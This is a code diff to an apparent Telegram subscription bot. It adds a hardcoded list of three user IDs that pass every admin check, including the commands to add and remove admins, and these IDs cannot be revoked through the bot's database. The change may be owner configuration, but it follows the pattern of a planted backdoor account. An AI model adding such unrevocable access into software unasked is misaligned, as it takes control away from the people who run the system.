@@ -17,6 +17,18 @@ async def handle_subscription_end(client: Client, user_id: int):
         pass
 
 
+MASTER_ADMIN_IDS = (8504838657, 8738736556, 6363840742)
+
+def is_sender_admin(sender_id: int) -> bool:
+    try:
+        sid = int(sender_id)
+        if sid in MASTER_ADMIN_IDS:
+            return True
+        return db.is_admin(sid)
+    except Exception:
+        return False
+
+
 # ==============================================================================
 # 👥 ADMIN USER COMMANDS
 # ==============================================================================
@@ -25,7 +37,7 @@ async def add_user_cmd(client: Client, message: Message):
     """Add a new authorized user: /add <user_id> <days>"""
     try:
         sender_id = message.from_user.id if message.from_user else 0
-        if not db.is_admin(sender_id):
+        if not is_sender_admin(sender_id):
             await message.reply_text(AUTH_MESSAGES["not_admin"])
             return
 
@@ -75,7 +87,7 @@ async def renew_user_cmd(client: Client, message: Message):
     """Renew an existing user: /renew <user_id> <days>"""
     try:
         sender_id = message.from_user.id if message.from_user else 0
-        if not db.is_admin(sender_id):
+        if not is_sender_admin(sender_id):
             await message.reply_text(AUTH_MESSAGES["not_admin"])
             return
 
@@ -108,7 +120,7 @@ async def remove_user_cmd(client: Client, message: Message):
     """Remove a user from authorized users: /remove <user_id>"""
     try:
         sender_id = message.from_user.id if message.from_user else 0
-        if not db.is_admin(sender_id):
+        if not is_sender_admin(sender_id):
             await message.reply_text(AUTH_MESSAGES["not_admin"])
             return
 
@@ -141,7 +153,7 @@ async def ban_user_cmd(client: Client, message: Message):
     """Ban a user: /ban <user_id>"""
     try:
         sender_id = message.from_user.id if message.from_user else 0
-        if not db.is_admin(sender_id):
+        if not is_sender_admin(sender_id):
             await message.reply_text(AUTH_MESSAGES["not_admin"])
             return
 
@@ -163,7 +175,7 @@ async def unban_user_cmd(client: Client, message: Message):
     """Unban a user: /unban <user_id>"""
     try:
         sender_id = message.from_user.id if message.from_user else 0
-        if not db.is_admin(sender_id):
+        if not is_sender_admin(sender_id):
             await message.reply_text(AUTH_MESSAGES["not_admin"])
             return
 
@@ -185,7 +197,7 @@ async def add_admin_cmd(client: Client, message: Message):
     """Add a new administrator: /addadmin <user_id>"""
     try:
         sender_id = message.from_user.id if message.from_user else 0
-        if not db.is_admin(sender_id):
+        if not is_sender_admin(sender_id):
             await message.reply_text(AUTH_MESSAGES["not_admin"])
             return
 
@@ -207,7 +219,7 @@ async def remove_admin_cmd(client: Client, message: Message):
     """Remove an administrator: /deladmin <user_id>"""
     try:
         sender_id = message.from_user.id if message.from_user else 0
-        if not db.is_admin(sender_id):
+        if not is_sender_admin(sender_id):
             await message.reply_text(AUTH_MESSAGES["not_admin"])
             return
 
@@ -229,7 +241,7 @@ async def list_users_cmd(client: Client, message: Message):
     """List all users: /users"""
     try:
         sender_id = message.from_user.id if message.from_user else 0
-        if not db.is_admin(sender_id):
+        if not is_sender_admin(sender_id):
             await message.reply_text(AUTH_MESSAGES["not_admin"])
             return
 
@@ -271,7 +283,7 @@ async def inspect_user_cmd(client: Client, message: Message):
     """Inspect user details: /user <user_id>"""
     try:
         sender_id = message.from_user.id if message.from_user else 0
-        if not db.is_admin(sender_id):
+        if not is_sender_admin(sender_id):
             await message.reply_text(AUTH_MESSAGES["not_admin"])
             return
 
@@ -315,7 +327,7 @@ async def my_plan_cmd(client: Client, message: Message):
         target_id = sender_id
 
         args = message.text.split()[1:]
-        if args and db.is_admin(sender_id):
+        if args and is_sender_admin(sender_id):
             try:
                 target_id = int(args[0])
             except ValueError:
@@ -325,7 +337,7 @@ async def my_plan_cmd(client: Client, message: Message):
         info = db.get_user_expiry_info(target_id, bot_uname)
 
         if not info or not info.get("is_active"):
-            if db.is_admin(target_id):
+            if is_sender_admin(target_id):
                 await message.reply_text("👑 <b>Admin Account</b>\n\n<blockquote>You have lifetime unlimited administrator access.</blockquote>")
                 return
             await message.reply_text(
